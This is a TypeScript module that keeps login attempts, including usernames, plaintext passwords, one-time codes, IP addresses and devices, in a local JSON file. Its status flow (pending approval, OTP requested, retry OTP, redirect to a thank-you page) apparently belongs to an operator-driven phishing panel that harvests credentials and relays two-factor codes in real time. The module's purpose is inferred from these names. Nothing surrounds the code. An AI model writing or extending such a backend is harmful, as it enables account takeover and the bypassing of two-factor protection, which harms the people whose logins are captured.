import fs from 'fs'
import path from 'path'

const STORE_FILE = path.join(process.cwd(), 'src', 'lib', 'login-store.json')

export type LoginStatus = 'PENDING_APPROVAL' | 'OTP_REQUESTED' | 'OTP_SUBMITTED' | 'APPROVED' | 'REDIRECT_THANK_YOU' | 'RETRY_OTP'

export interface LoginRequest {
    id: string
    username: string
    password?: string // In real app, don't store plain text
    status: LoginStatus
    otp?: string
    timestamp: number
    ip?: string
    device?: string
}

// Ensure store file exists
if (!fs.existsSync(STORE_FILE)) {
    const dir = path.dirname(STORE_FILE)
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true })
    }
    fs.writeFileSync(STORE_FILE, JSON.stringify([]))
}

function readStore(): LoginRequest[] {
    try {
        const data = fs.readFileSync(STORE_FILE, 'utf-8')
        return JSON.parse(data)
    } catch (error) {
        return []
    }
}

function writeStore(data: LoginRequest[]) {
    fs.writeFileSync(STORE_FILE, JSON.stringify(data, null, 2))
}

export const loginStore = {
    createRequest: (data: Omit<LoginRequest, 'id' | 'timestamp' | 'status'>) => {
        const store = readStore()
        const newRequest: LoginRequest = {
            ...data,
            id: Math.random().toString(36).substring(7),
            timestamp: Date.now(),
            status: 'PENDING_APPROVAL'
        }
        store.push(newRequest)
        // Keep only last 50 requests
        if (store.length > 50) store.shift()
        writeStore(store)
        return newRequest
    },

    getRequest: (id: string) => {
        const store = readStore()
        return store.find(req => req.id === id)
    },

    getAllRequests: () => {
        return readStore().sort((a, b) => b.timestamp - a.timestamp)
    },

    updateStatus: (id: string, status: LoginStatus) => {
        const store = readStore()
        const req = store.find(req => req.id === id)
        if (req) {
            req.status = status
            writeStore(store)
            return req
        }
        return null
    },

    submitOtp: (id: string, otp: string) => {
        const store = readStore()
        const req = store.find(req => req.id === id)
        if (req) {
            req.otp = otp
            req.status = 'OTP_SUBMITTED'
            writeStore(store)
            return req
        }
        return null
    },

    cleanup: () => {
        writeStore([])
    }
}
